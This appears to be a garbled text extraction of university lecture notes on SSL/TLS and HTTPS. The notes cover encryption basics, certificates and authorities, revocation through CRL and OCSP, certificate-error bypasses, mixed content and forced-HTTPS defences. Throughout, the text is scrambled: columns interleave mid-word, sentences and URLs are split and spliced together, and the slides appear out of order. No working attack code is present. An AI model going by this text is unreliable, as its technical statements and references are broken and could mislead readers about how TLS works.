o hrome	&#13; now	&#13; block	&#13; mixed	&#13; scripting	&#13; by	&#13; default.	&#13; ist	&#13; of	&#13; preloads. 	&#13; 
o Ref:	&#13; 
vulnerabilities.html	&#13; http://blog.chromium.org/2012/08/ending-mixed-scripting-
o Ref:	&#13; blohttps://blog.mozilla.org/tanvi/2013/04/10/mixed-
Ref:	&#13; cki
http://blogs.msdn.com/b/ie/archive/2011/06/23/internet-ng-enabled -in-firefox -23/	&#13; content-
ex
contplorer
ent.aspx-9-secu
	&#13; rity-part-4-protecting -consumers-from-malicious-mixed-
	&#13; Another	&#13; recent	&#13; experiment	&#13; 
 
 Focuses	&#13; on	&#13; the	&#13; "power	&#13; uin	&#13; t

Allows	&#13; users	&#13; to	&#13; force	&#13; the	&#13; use	&#13; of	&#13; Hser"his	&#13; spa
	&#13; aspectce:	&#13; HTTPS
	&#13; of	&#13; ForceHTTPS-Everywher
.	&#13; e.	&#13; 
  
 ColAdd-on	&#13; for	&#13; Firefox	&#13; and	&#13; Claboration	&#13; between	&#13; Tor	&#13; 
hrome.	&#13; and	&#13; EFF.TTPS	&#13; for	&#13; some	&#13; domains.	&#13; 
	&#13; 
	&#13; Comes	&#13; with	&#13; rules	&#13; to	&#13; rewrite	&#13; URLs	&#13; for	&#13; popular	&#13; web	&#13; sites.	&#13; 
Other	&#13; ways	&#13; to	&#13; address	&#13; problems	&#13; in	&#13; SSL/TLS	&#13;  Better	&#13; tools	&#13; /	&#13; better	&#13; developers	&#13; to	&#13; avoid	&#13; programming	&#13; mistakes.	&#13; 
o 
o 
o Mar
Avoid	&#13; any	&#13; insecure	&#13; embedding	&#13; (#3).	&#13; k	&#13; all	&#13; sensitive	&#13; cookies	&#13; as	&#13; Secure	&#13; (#4). 	&#13; 
o 
 Unfortunately,	&#13; seems	&#13; error
EV	&#13; cer
o tifDoes	&#13; 
icatesnot
.	&#13; 	&#13; help	&#13; end -users	&#13; (requ-prone..
ires	&#13; developer	&#13; involvement).	&#13; 	&#13; 
o 
o Trying	&#13; to	&#13; address	&#13; problem	&#13; 5:	&#13; users	&#13; don't	&#13; know	&#13; what	&#13; to	&#13; look	&#13; for	&#13; in	&#13; cert.	&#13; 
o In	&#13; addition	&#13; to	&#13; URL,	&#13; embed	&#13; the	&#13; company	&#13; name	&#13; (e.g.,	&#13; "PayPal,	&#13; Inc.")	&#13; 
o Typica
Why	&#13; wolly	&#13; show
uld	&#13; thiss	&#13; up	&#13; a
	&#13; be	&#13; more	&#13; secure?	&#13; s	&#13; a	&#13; green	&#13; box	&#13; next	&#13; to	&#13; the	&#13; URL	&#13; bar.	&#13; 
o 
 When	&#13; would	&#13; it	&#13; actually	&#13; improve	&#13; security?	&#13; 
 BlacklisMight	&#13; indirectly	&#13; help	&#13; solve	&#13; #2,	&#13; if	&#13; users	&#13; come	&#13; to	&#13; expect	&#13; EV
Bro
ows
 ert	&#13; we
s	&#13; arak	&#13; cr
e	&#13; starypto.	&#13; certificates.	&#13; 
ting	&#13; to	&#13; 
 (iOS	&#13; 5,	&#13; Chrome	&#13; 18,	&#13; Firefox	&#13; 16)	&#13; 	&#13; reject	&#13; MD5	&#13; signatures	&#13; on	&#13; certificates 	&#13; 
and
o
 	&#13; RSA	&#13; keys	&#13; with	&#13; &lt;	&#13; 1024	&#13; bits.	&#13; 
and
o	&#13; e 
 ve(C
n	&#13; SHhrome	&#13; 18,	&#13; OS	&#13; X	&#13; 10.7.4,	&#13; Windows	&#13; XP+	&#13; after	&#13; a	&#13; recent	&#13; update)	&#13; 
Ref:	&#13; A-1	&#13; by	&#13; Chrome.	&#13; 
 OCSP	&#13; s
o taplisunsethttp://googleonlinesecurity.blogspot.com/2014/09/g
ting-sha -1.html	&#13; radually -
o OCSP	&#13; responses	&#13; are	&#13; signed	&#13; by	&#13; Cng.	&#13; 
A.	&#13; 
Server	&#13; sends	&#13; OCSP	&#13; response	&#13; in	&#13; handshake	&#13; instead	&#13; of	&#13; querying	&#13; onl
ine	&#13; 
(#2). 	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>Use	&#13; TLS	&#13; (a	&#13; cryptographic	&#13; prot
 NegotTLS	&#13; encrypt
iate	&#13; ciphers	&#13; (and	&#13; other	&#13; features:	&#13; compression,	&#13; extensions).	&#13; s	&#13; and	&#13; authenticates	&#13; netocol	&#13; t
what
ork	&#13; uses	&#13; cert
	&#13; traffic. 	&#13; ificates). 	&#13; 
 Negot
Include	&#13; a	&#13; MACiation	&#13; is	&#13; 
	&#13; of	&#13; all	&#13; handshake	&#13; messages	&#13; to	&#13; authenticate.	&#13; done	&#13; in	&#13; clear.	&#13; 
	&#13; 
	&#13; 	&#13; B.	&#13; H
 
 ow	&#13; to
Goal:	&#13; connect	&#13; browser	&#13; security	&#13; mechanisms	&#13; to	&#13; whatever	&#13; 	&#13; protect	&#13; data	&#13; and	&#13; code	&#13; in	&#13; the	&#13; user's	&#13; browser? 	&#13; 
Recall	&#13; that	&#13; browser	&#13; has	&#13; two	&#13; main	&#13; security	&#13; mechanisms:TLS	&#13; provides.	&#13; 
	&#13; o 
Same-o Same-origin	&#13; pol	&#13; 
Cookie	&#13; policy	&#13; (slicy.
ight	&#13; 
 ly	&#13; different). 	&#13; 
o 
o origin	&#13; pol
TLS	&#13; certificate	&#13; name	&#13; must	&#13; match	&#13; hostname	&#13; in	&#13; the	&#13; URL	&#13; icy	&#13; with	&#13; HTTPS/TLS. 	&#13; 
o o In	&#13; our	&#13; example,	&#13; certificate	&#13; name	&#13; must	&#13; be	&#13; 
One	&#13; level	&#13; of	&#13; wildcard	&#13; is	&#13; also	&#13; allowed	&#13; (*.paypal.comwww.paypal.com.	&#13; 
 Browsers	&#13; trust	&#13; a	&#13; number	&#13; of	&#13; certificate	&#13; authorities.	&#13; )	&#13; 
Origin	&#13; (from	&#13; the	&#13; same-
o 
o http://www.paypal.com/origin	&#13; policy)	&#13; incl
	&#13; is	&#13; different	&#13; from	&#13; udes	&#13; the	&#13; protocol. 	&#13; 
o o Here,
Result:	&#13; non	&#13; we	&#13; care	&#13; about	&#13; integrity	&#13; o ata	&#13; (e avashttps://www.paypal.com/	&#13; 
-HTTPS	&#13; pages	&#13; cannot	&#13; tamper	&#13; with	&#13; Hf	&#13; d .g.,	&#13; J cript	&#13; code). 	&#13; 
	&#13; 
 Rationale:	&#13; non -HTTPS	&#13; pages	&#13; could	&#13; have	&#13; been	&#13; modified	&#13; by	&#13; adversary.	&#13; TTPS	&#13; pages.	&#13; 
Cook
o 
o ies	&#13; 
Serwit
verh	&#13; HTTPS
	&#13; certificates	&#13; help	&#13; clients	&#13; differ/TLS. 	&#13; 
o Cookies	&#13; (common	&#13; form	&#13; of	&#13; user	&#13; credentials)	&#13; have	&#13; a	&#13; "Secure"	&#13; flag.	&#13; entiate	&#13; between	&#13; serv ers.	&#13; 
o Secur
Non-Secure	&#13; cookies	&#13; can	&#13; only	&#13; be	&#13; sent	&#13; with	&#13; H
e	&#13; cookies	&#13; can	&#13; be	&#13; sent	&#13; with	&#13; HTTPS	&#13; r
TTP	&#13; and	&#13; Hequests.
TTPS	&#13; r	&#13; 
	&#13; 
 equests. 	&#13; 
What	&#13; happens	&#13; if	&#13; adversary	&#13; tampers	&#13; with	&#13; DNS	&#13; records?	&#13; 
o 
o 
o Good	&#13; new
We	&#13; already	&#13; assumed	&#13; adversary	&#13; can	&#13; tamper	&#13; with	&#13; network	&#13; packets.	&#13; s:	&#13; security	&#13;  doesn't	&#13; depend	&#13; on	&#13; DNS.	&#13; 
	&#13; Wrong	&#13; server	&#13; will	&#13; not	&#13; know	&#13; correct	&#13; private	&#13; key	&#13; matching	&#13; certificate.	&#13; 
	&#13; 	&#13; C.	&#13; Fin
 
 ally,	&#13; users	&#13; 
 LockBrowser	&#13; should	&#13; indicate	&#13; to	&#13; the	&#13; user	&#13; the	&#13; name	&#13; in	&#13; the	&#13; site's	&#13; certificate.	&#13; 	&#13; icon	&#13; inca
	&#13; n
the	&#13; 	&#13; en
bter	&#13; 
rowcreden
ser	&#13; teltia
ls	&#13; usls	&#13; direct
er	&#13; thel
yy.
'	&#13; 
r	&#13; 
eHow
	&#13; inte	&#13; t
ro	&#13; 
acsecu
ting	&#13; wire	&#13; t
thha
	&#13; Ht?
T	&#13; 
TPS	&#13; site.	&#13; 
	&#13; User	&#13; should	&#13; verify	&#13; site	&#13; name	&#13; they	&#13; intend	&#13; to	&#13; give	&#13; credentials	&#13; to.	&#13; 
How 
 As	&#13; you	&#13; might	&#13; expect,	&#13; every	&#13; step	&#13; above	&#13; can	&#13; go	&#13; 	&#13; can	&#13; this	&#13; plan	&#13; go	&#13; wrong? 	&#13; 
Not	&#13; an	&#13; exhaustive	&#13; list,	&#13; but	&#13; gets	&#13; at	&#13; problems	&#13; that	&#13; ForceHwrong.	&#13; 
	&#13; 
1	&#13; (A).	&#13; Cryptography.	&#13; TTPS	&#13; wants	&#13; to	&#13; solve.	&#13; 
	&#13; 
3</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 14 	&#13; 
	&#13; 
This	&#13; l
 How	&#13; to	&#13; cryptographically	&#13; protect	&#13; network	&#13; communications,	&#13; ecture	&#13; is	&#13; about	&#13; two	&#13; related	&#13; tSSL/TLS	&#13; an
opics: 	&#13; d	&#13; HTTPS
 th
Howan	&#13; Ke
	&#13; to	&#13; r
inbe
tegro
ras?	&#13; 	&#13; [	&#13; T
te	&#13; crypech
tni
ogq
raue
p:
hic	&#13; 	&#13; cer
pti
rotficates.	&#13; ] 	&#13; at	&#13; a	&#13; larger	&#13; scale	&#13; 
security	&#13; model?	&#13; 	&#13; [	&#13; HTTPS,	&#13; Secure	&#13; cookies,	&#13; etc.	&#13; ]	&#13; ection	&#13; of	&#13; network	&#13;  traffic	&#13; into	&#13; the	&#13; web	&#13; 
	&#13; 
Recall:	&#13; two	&#13; kinds	&#13; of	&#13; encryption	&#13; schemes.	&#13; 
 
 E	&#13; isSymmetric	&#13; key	&#13; cryptography	&#13; means	&#13; same	&#13; key	&#13; is	&#13; used	&#13; to	&#13; encrypt	&#13; &amp;
o	&#13; encr
 ypt,	&#13; D	&#13; is	&#13; decrypt	&#13; 
o 
 ciphert
plaintext	&#13; =ext	&#13; =	&#13; E_k
	&#13; D_k(cipher(plaint
text)ext)	&#13; 	&#13; decrypt	&#13; 
Asymmetric	&#13; key	&#13; (public-
o 	&#13; 
o ciphertext	&#13; =	&#13; E_PKke
(ply
aint)	&#13; cr
exypto
t)	&#13; graphy:	&#13; encrypt	&#13; &amp;	&#13; decrypt	&#13; keys	&#13; differ 	&#13; 
Pubo 
 plaintext	&#13; =
PK	&#13; and	&#13; SK	&#13; are	&#13; cal	&#13; D_SK(cipher
led	&#13; pubtext)
lic	&#13; and	&#13; secret	&#13; 
lic-key	&#13; cryptography	&#13; is	&#13; orders	&#13; of	&#13; magnitude	&#13; slower	&#13; than	&#13; symmetric	&#13; 	&#13; (private)	&#13; key,	&#13; respectively 	&#13; 
	&#13; 
Encr
 Message	&#13; authentication	&#13; code	&#13; (MACyption	&#13; pr
o ovides	&#13; data	&#13; secrecy,	&#13; often	&#13; als
 Look	&#13; up	&#13; HMAC	&#13; if	&#13; you're	&#13; interested	&#13; in	&#13; more	&#13; details.	&#13; )	&#13; with	&#13; symmetric	&#13; keys	&#13; can	&#13; provide	&#13; integrity.	&#13; o	&#13; want	&#13; integrity. 	&#13; 
Can
o	&#13; u
 
o se	&#13; 
Use	&#13; secret	&#13; key	&#13; to	&#13; generate	&#13; signature	&#13; (compute	&#13; D_SK)	&#13; public -key	&#13; crypto	&#13; to	&#13; sign	&#13; and	&#13; verify,	&#13;  almost	&#13; the	&#13; opposite:	&#13; 
	&#13; Use	&#13; public	&#13; key	&#13; to	&#13; check	&#13; signature	&#13; (compute	&#13; E_PK)	&#13; 
Recall	&#13; from	&#13; last	&#13; lecture:	&#13; Kerberos.	&#13; 
 
 
 Cen
When	&#13; A	&#13; wants	&#13; to	&#13; talk	&#13; to	&#13; B,	&#13; A	&#13; asks	&#13; the	&#13; KDCtral	&#13; KDC	&#13; knows	&#13; all	&#13; principals	&#13; and	&#13; their	&#13; 
	&#13; Ticket	&#13; contains	&#13; a	&#13; session	&#13; key	&#13; for	&#13; A	&#13; to	&#13; talk	&#13; to	&#13; B,	&#13; generated	&#13; by	&#13; KDC	&#13; to	&#13; keys.
issue	&#13; a	&#13; 
	&#13; ticket.	&#13; 
.	&#13; 
Wh 
 y
Mi	&#13; is
gh	&#13; Ke
t	&#13; norbe
t	&#13; hro
avs	&#13; no
e	&#13; a	&#13; st	&#13; e
 ino
ngleugh
	&#13; KD?	&#13; 	&#13; E.g.,	&#13; wh
C ustedy	&#13; i
	&#13; tosn'
	&#13; get	&#13; th
nee
Not	&#13; everyone	&#13; might	&#13; have	&#13; an	&#13; account	&#13; on	&#13; 	&#13; tr
thisr	&#13; we
	&#13; sate	&#13; sb	&#13; bas
essioed
n	&#13; ke	&#13; on	&#13; Ke
ys.	&#13; rberos? 	&#13; 
 KDC	&#13; might	&#13; not	&#13; scale	&#13; if	&#13; users	&#13; contact	&#13; it	&#13; every	&#13; time	&#13; they	&#13; went	&#13; to	&#13; a	&#13; web	&#13; site.	&#13; ingle	&#13; KDC. 	&#13; 
 UnfortThese	&#13; limitations	&#13; are	&#13; largely	&#13; inevitable	&#13; with	&#13; symmetric	&#13; encryption.	&#13; unate	&#13; that	&#13; KDC	&#13; knows	&#13; what	&#13; service	&#13; each	&#13; user	&#13; is	&#13; connecting	&#13; to. 	&#13; 
	&#13; 
Alternative	&#13; plan,	&#13; using	&#13; p
 
 Suppose	&#13; A	&#13; knows	&#13; the	&#13; public	&#13; key	&#13; of	&#13; B.	&#13; ublic	&#13; key	&#13; encryption.	&#13; 
 Don
Strawman	&#13; protocol	&#13; for	&#13; establishing	&#13; a	&#13; secure	&#13; connection	&#13; between	&#13; A	&#13; and	&#13; B:
o't
 	&#13; want	&#13; to	&#13; use	&#13; public -key	&#13; encryption	&#13; all	&#13; the	&#13; time	&#13; (slow).	&#13; 
o A	&#13; generates	&#13; a	&#13; random	&#13; symmetric	&#13; session	&#13; key	&#13; S.	&#13; 	&#13; 
A	&#13; encrypts	&#13; S	&#13; for	&#13; PK_B,	&#13; sends	&#13; to	&#13; B.	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>oNow	&#13; we	&#13; have	&#13; secret	&#13; key	&#13; S	&#13; shared	&#13; between	&#13; A	&#13; and	&#13; B,	&#13; can	&#13; encrypt	&#13; and
	&#13;  
authenticate	&#13; messages	&#13; using	&#13; symmetric	&#13; encryption,	&#13; much	&#13; like	&#13; Kerberos.	&#13; 	&#13; 
Good	&#13; properties	&#13; of	&#13; this	&#13; strawman	&#13; protocol:
 A's	&#13; data	&#13; seen	&#13; only	&#13; by	&#13; B.	&#13; 
o 	&#13; 
o Only	&#13; B	&#13; (
	&#13;  	&#13; can	&#13; d
No	&#13; Only	&#13; B	&#13; can	&#13; thwith	&#13; SK_B) ecrypt	&#13; S. 	&#13; 
need	&#13; for	&#13; a	&#13; KDC -lius
ke	&#13; d
	&#13; cee
ntrcrypt	&#13; d
al	&#13; authata	&#13; e
orncr
ity	&#13; toypte
	&#13; handd	&#13; und
	&#13; out	&#13; ser	&#13; S.
es	&#13; 
sion	&#13; keys.	&#13; 
What	&#13; goes	&#13; wrong	&#13; with	&#13; this	&#13; strawman?	&#13; 
 Adversary	&#13; can	&#13; record	&#13; and	&#13; later	&#13; replay	&#13; A's	&#13; traffic;	&#13; B	&#13; would	&#13; not	&#13; notice.	&#13; 
o 
o 
Adversary	&#13; can	&#13; impersonate	&#13; A,	&#13; by	&#13; sending	&#13; anothero Solution:	&#13; have	&#13; B	&#13; send	&#13; a	&#13; nonce	&#13; (ra ndom	&#13; value).	&#13; 
o 
 OfIncorporate	&#13; the	&#13; nonce	&#13; into	&#13; the	&#13; final	&#13; master	&#13; secret	&#13; S'	&#13; =	&#13; f(S,	&#13; nonce).	&#13; 
This	&#13; process	&#13; tten,	&#13; S	&#13; is	&#13; calle
o	&#13; estd	&#13; th
ae
b	&#13; pr
lish	&#13; S'	&#13; is	&#13; cae-master	&#13; secret,	&#13; and	&#13; S'	&#13; is	&#13; the	&#13; master	&#13; secret.	&#13; 
o lled	&#13; the	&#13; "handshake". 	&#13; 
o Many	&#13; possible	&#13; solutions,	&#13; if	&#13; B	&#13; cares	&#13; who	&#13; A	&#13; is.	&#13; 	&#13; symmetric	&#13; key	&#13; to	&#13; B.	&#13; 
o 
o E.g.,	&#13; B	&#13; also	&#13; chooses	&#13; and	&#13; sends	&#13; a	&#13; symmetric	&#13; key	&#13; to	&#13; A,	&#13; encrypted	&#13; with	&#13; PK_A.	&#13; 
 Then	&#13; both	&#13; A	&#13; and	&#13; B	&#13; use	&#13; a	&#13; hash	&#13; of	&#13; the	&#13; two	&#13; keys	&#13; combined.	&#13; 
Adversary	&#13; can	&#13; later	&#13; obtain	&#13; SK_B,	&#13; decrypt	&#13; symmetric	&#13; key	&#13; and	&#13; all	&#13; messages.	&#13; 
o This	&#13; is	&#13; roughly	&#13; how	&#13; TLS	&#13; client	&#13; certificates	&#13; work.	&#13; 
Solution:	&#13; use	&#13; a	&#13; key	&#13; exchange	&#13; pr
forward	&#13; secrecy,	&#13; as	&#13; discussed	&#13; in	&#13; otocol	&#13; like	&#13; D
last	&#13; lecture.iffie
	&#13; -Hellman,	&#13; which	&#13; provides	&#13; 
	&#13; 
H
 
 ard	&#13; problem:	&#13; what	&#13; if	&#13; neither	&#13; computer	&#13; knows	&#13; each	&#13; other's	&#13; public	&#13; key?	&#13; 
 CC
ertificate	&#13; is	&#13; tuple	&#13; (name,	&#13; pubkey),	&#13; signed	&#13; by	&#13; certificate	&#13; authority.	&#13; ommon	&#13; approach:	&#13; use	&#13; a	&#13; trusted	&#13; third	&#13; party	&#13; to	&#13; generate	&#13; certificates.	&#13; 
 
 B	&#13; sends	&#13; A	&#13; a	&#13; pubkey	&#13; along	&#13; with	&#13; a	&#13; certificate.	&#13; Meaning:	&#13; certificate	&#13; authority	&#13; claims	&#13; that	&#13; name's	&#13; public	&#13; key	&#13; is	&#13; pubkey.	&#13; 
	&#13; If	&#13; A	&#13; trusts	&#13; certificate	&#13; authority,	&#13; continue	&#13; as	&#13; above.	&#13; 
Why	&#13; might	&#13; certificates	&#13; be	&#13; better	&#13; than	&#13; Kerberos?	&#13; 
 
 
 No	&#13; need	&#13; to	&#13; talk	&#13; to	&#13; KDC
Ser	&#13; each	&#13; time	&#13; client	&#13; connects	&#13; to	&#13; a	&#13; new	&#13; server.	&#13; 
 KDCver
	&#13; no	&#13; can	&#13; pr
Can	&#13; support	&#13; "anonymous"	&#13; clients	&#13; that	&#13; have	&#13; no	&#13; long-t	&#13; involvesent	&#13; cer
ed	&#13; in	&#13; generatificate	&#13; to	&#13; client;	&#13; client	&#13; can	&#13; ver
ting	&#13; session	&#13; keys. 	&#13; ify	&#13; signature. 	&#13; 
	&#13; lived	&#13; key	&#13; /	&#13; certificate. 	&#13; 
Pl 
 an	&#13; for	&#13; securing	&#13; web	&#13; browsers:	&#13; HTTPS.
Need	&#13; New	&#13; protocol:	&#13; https	&#13; instead	&#13; of	&#13; http	&#13; (e.g.,	&#13; https://www.paypal.com/).	&#13; 
A. 
 to	&#13; 
Daprot
ta	&#13; senect	&#13; 
tsevera
	&#13; over	&#13; tl t
B.he	&#13; net	&#13;  hings: 	&#13; 	&#13; 
Code/data	&#13; in	&#13; user's	&#13; browwork
ser..	&#13; 
C. UI	&#13; seen	&#13; by	&#13; the	&#13; user.	&#13; 	&#13; 
	&#13; 
	&#13; 	&#13; A.	&#13; How	&#13; to	&#13; ensure	&#13; data	&#13; is	&#13; not	&#13; sniffed	&#13; or	&#13; tampered	&#13; with	&#13; on	&#13; the	&#13; network?	&#13; 
2</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>There	&#13; have	&#13; been	&#13; some	&#13; attacks	&#13; on	&#13; the	&#13; cryptographic	&#13; parts	&#13; of	&#13; SSL/TLS.	&#13; 
 Attack	&#13; by	&#13; Rizzo	&#13; and	&#13; Duong	&#13; can	&#13; allow	&#13; adversary	&#13; to	&#13; learn	&#13; some	&#13; plaintext	&#13; by	&#13; 
issuing	&#13; 
o Ref:	&#13; many	&#13; carefully-chosen	&#13; requests	&#13; over	&#13; a	&#13; single	&#13; connection.	&#13; 
 ht
zzodu.html	&#13; tp://www.educatedguesswork.org/2011/09/secur ity_impact_of_the_ri
Moo
Recent	&#13; attack	&#13; by	&#13; same	&#13; people	&#13; using	&#13; compression,	&#13; mentioned	&#13; in	&#13; iSEC
 
 st	&#13; recently,	&#13; more	&#13; padding	&#13; oracle	&#13; attacks.	&#13; 
o Ref:	&#13; http ://en.wikipedia.org/wiki/CRIME 	&#13; 	&#13; lecture.	&#13; 
 
 Some	&#13; servers/CRef:	&#13; https://www.op
As	&#13; use	&#13; weak	&#13; crypto,	&#13; e.g.	&#13; certificates	&#13; using	&#13; MD5.	&#13; enssl.org/~bodo/ssl-poodle.pdf	&#13; 
Some	&#13; clients	&#13; choose	&#13; weak	&#13; crypto	&#13; (e.g.,	&#13; SSL/TLS	&#13; on	&#13; Android).	&#13; 
But,	&#13; cryptography	&#13; is	&#13; rarely	&#13; the	&#13; weakest	&#13; part	&#13; of	&#13; a	&#13; system.	&#13; o 
 Ref:	&#13; http://op -co.de/blo g/posts/android_ssl_downgrade/ 	&#13; 
	&#13; 
2	&#13; (B).	&#13; Authen
	&#13; 
Adversary	&#13; may	&#13; be	&#13; able	&#13; to	&#13; obtain	&#13; a	&#13; certificate	&#13; for	&#13; someone	&#13; else's	&#13; name.	&#13; ticating	&#13; the	&#13; server.	&#13; 
 
  Used	&#13; to	&#13; require	&#13; a	&#13; faxed	&#13; request	&#13; on	&#13; company	&#13; letterhead	&#13; (but	&#13; hNow	&#13; often	&#13; requires	&#13; receiving	&#13; secret	&#13; token	&#13; at	&#13; root@domain.com	&#13; or	&#13; similar.	&#13; ow	&#13; to	&#13; check?)	&#13; 
  Secur
There	&#13; are	&#13; 100's	&#13; of	&#13; trusted	&#13; certificate	&#13; authorities	&#13; in	&#13; most	&#13; browsers.	&#13; ity	&#13; depends	&#13; on	&#13; the	&#13; policy	&#13; of	&#13; least	&#13; secure	&#13; certificate	&#13; authority. 	&#13; 
o 

H	&#13;  Several	&#13; C
Ref:	&#13; A	&#13; compromises	&#13; in	&#13; 2011	&#13; (certs	&#13; for	&#13; gmail,	&#13; facebook,	&#13; ..)	&#13; 
Servers	&#13; may	&#13; be	&#13; compromised	&#13; and	&#13; the	&#13; corresponding	&#13; private	&#13; key	&#13; stolen.	&#13; http://dankam insky.com/2011/08/31/notnotar/	&#13; 
 
 ow	&#13; to	&#13; deal	&#13; with	&#13; compromised	&#13; certificate	&#13; (e.g.,	&#13; invalid	&#13; cert	&#13; or	&#13; stolen	&#13; key)?	&#13; 
 CertChecking	&#13; certificate	&#13; status	&#13; with	&#13; Cificates	&#13; have	&#13; expiratio n	&#13; dates.
Certificate	&#13; Revocation	&#13; List	&#13; (CRL)	&#13; published	&#13; by	&#13; some	&#13; CA	&#13; on	&#13; every	&#13; request	&#13; is	&#13; hard	&#13; to	&#13; scale.	&#13; 	&#13; 
 certificates	&#13; in	&#13; them	&#13; (spot-checking:	&#13; most	&#13; have	&#13; zero	&#13; revoked	&#13; certs).	&#13; A's,	&#13; but	&#13; relatively	&#13; few	&#13; 
CRL	&#13; must	&#13; be	&#13; periodically	&#13; downlo
OCSP:o 
o ed	&#13; by	&#13; clie
ould	&#13; be	&#13; slow,	&#13; if	&#13; many	&#13; certs	&#13; are	&#13; revoked.	&#13; ad
 Not	&#13; a	&#13; problem	&#13; if	&#13; few	&#13; or	&#13; zero	&#13; certs	&#13; are	&#13; revoked,	&#13; but	&#13; not	&#13; too	&#13; useful.	&#13; Cnt.	&#13; 
o 	&#13; o
Quenline
ry	&#13; wh	&#13; certificate	&#13; status	&#13; protocol. 	&#13; 
 One	&#13; issue:e
	&#13; OCthe
SP	&#13; prr	&#13; a	&#13; ce
or
totif
coicate
l	&#13; di	&#13; i
ds
n'	&#13; vali
t	&#13; red
qui	&#13; or
r	&#13; no
e	&#13; signing	&#13; "try	&#13; later"	&#13; messages.	&#13; t.	&#13; 
Variouo 
 
o Ref:	&#13; http://www.thoughtcr
o s	&#13; heuristics	&#13; for	&#13; guessing	&#13; whether	&#13; certime.org/papers/ocsp-
ificate	&#13; is	&#13; OK	&#13; or	&#13; not.attack.pdf 	&#13; 
 Problem:	&#13; online	&#13; revocation	&#13; checks	&#13; are	&#13; soft-
o Not	&#13; as	&#13; easy	&#13; as	&#13; "did	&#13; the	&#13; cert	&#13; change?".	&#13; Websites	&#13; sometimes	&#13; test	&#13; new	&#13; CCertPatrol,	&#13; EFF's	&#13; SSL	&#13; Observatory,	&#13; ..	&#13; 	&#13; 
o An	&#13; active	&#13; network	&#13; attacker	&#13; can	&#13; just	&#13; make	&#13; the	&#13; checks	&#13; unavailable.	&#13; fail.	&#13; As.	&#13; 
Bro
ws
 ers	&#13; don't	&#13; like	&#13; blocking	&#13; on	&#13; a	&#13; side	&#13; channel. 	&#13; 
Performance,	&#13; single	&#13; point	&#13; of	&#13; failure,	&#13; captive	&#13; portals,	&#13; etc.	&#13; 
4</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>In	&#13; practice	&#13; browsers	&#13; push	&#13; updates	&#13; with	&#13; blacklist	&#13; after	&#13; major	&#13; breaches.	&#13;  
 Ref:	&#13; 
o https://www.imperialviolet.org/2011/03/18/revocation.html	&#13; 
	&#13; Ref:	&#13; https://www.imperialviolet.org/2012/02/05/crlsets.html	&#13; 
Users	&#13; ignore	&#13; certificate	&#13; mismatch	&#13; errors.	&#13; 
 
 
 Despite	&#13; certificates	&#13; being	&#13; easy	&#13; to	&#13; obtain,	&#13; many	&#13; sites	&#13; misconfigure	&#13; them.	&#13; 
 Some	&#13; don't	&#13; want	&#13; to	&#13; deal	&#13; with	&#13; (non-Others	&#13; forget	&#13; to	&#13; renew	&#13; them	&#13; (certificates	&#13; have	&#13; expiration	&#13; dates).	&#13; zero)	&#13; cost	&#13; of	&#13; getting	&#13; certificates. 	&#13; 
End	&#13; result:	&#13; browsers	&#13; allow	&#13; users	&#13; to	&#13; override	&#13; mismatched	&#13; certificates.	&#13; 
o 
o Problematic:	&#13; human	&#13; is	&#13; now	&#13; part	&#13; of	&#13; the	&#13; proces
brHard	&#13; s
 owsfor	&#13; 
ersdevel
.	&#13; opers	&#13; to	&#13; exactly	&#13; know	&#13; what	&#13; certs	&#13; 	&#13; in	&#13; d
wile
l	&#13; c
bi
e	&#13; di
ang	&#13; i
ccepf	&#13; c
te
ed	&#13; rt	&#13; i
bs
y	&#13; 	&#13; valid. 	&#13; 
Empirically,	&#13; about	&#13; 60%	&#13; of	&#13; bypass	&#13; buttons	&#13; shown	&#13; by	&#13; C
o (Though	&#13; this	&#13; data	&#13; might	&#13; be	&#13; stale	&#13; at	&#13; this	&#13; point..)hrome	&#13; are	&#13; clicked	&#13; through.	&#13; 
	&#13; 
Wh	&#13; 
 
 at's	&#13; the	&#13; risk	&#13; of	&#13; a	&#13; user	&#13; accepting	&#13; an	&#13; invalid	&#13; certificate? 	&#13; 
 Mi
Might	&#13; be	&#13; a	&#13; man-ght	&#13; be	&#13; benign	&#13; (
ine
-xpi
ther
-middle	&#13; attack,	&#13; connecting	&#13; to	&#13; adversary's	&#13; server.	&#13; ed	&#13; cert,	&#13; server	&#13; operator	&#13; forgot	&#13; to	&#13; renew). 	&#13; 
Why
o	&#13; i
 
o s	&#13; th
User's	&#13; bis	&#13; bad
 row?	&#13; 
oUser	&#13; might	&#13; enter	&#13; sensitive	&#13; data	&#13; into	&#13; adversary's	&#13; website.	&#13; ser	&#13; will	&#13; send	&#13; user's	&#13; cookies	&#13; t o	&#13; the	&#13; adversary. 	&#13; 
	&#13; 
3	&#13; (B).	&#13; MixinUser	&#13; might	&#13; assume	&#13; data	&#13; on	&#13; the	&#13; page	&#13; is	&#13; coming	&#13; from	&#13; the	&#13; right	&#13; site.	&#13; 
Web	&#13; page	&#13; origin	&#13; is	&#13; determined	&#13; by	&#13; the	&#13; URL	&#13; of	&#13; the	&#13; page	&#13; itself.	&#13; embedded	&#13; elements:	&#13; g	&#13; HTTP	&#13; and	&#13; HTTPS	&#13; content.	&#13; 
 Page	&#13; can	&#13; have	&#13;  many	&#13; 
 
 JaCSva
S	&#13; stscrip
yle	&#13; t
sheet	&#13; via	&#13; &lt;SCRIPT&gt;	&#13; tags 	&#13; 
 Fl
Images	&#13; via	&#13; &lt;IMG&gt;	&#13; tags	&#13; ash	&#13; code	&#13; via	&#13; &lt;Es	&#13; via
MB	&#13; &lt;S
ED&gt;	&#13; TYLE
tag&gt;	&#13; 
s	&#13; tags	&#13; 
If	&#13; adversary	&#13; can	&#13; tamper	&#13; with	&#13; these	&#13; elements,	&#13; could	&#13; control	&#13; the	&#13; page.	&#13; 
Ja
 va
Cscrip
SS:	&#13; less	&#13; control,	&#13; but	&#13; still	&#13; abusable,	&#13; esp	&#13; w/	&#13; complex	&#13; attribute	&#13; selectors.	&#13; t	&#13; and	&#13; Flash	&#13; code	&#13; give	&#13; control	&#13; over	&#13; page.	&#13; In	&#13; particular,	&#13; 
Probably	&#13; the	&#13; developer	&#13; wouldn't	&#13; include	&#13; Javascript	&#13; from	&#13; attacker's	&#13; site.	&#13; 
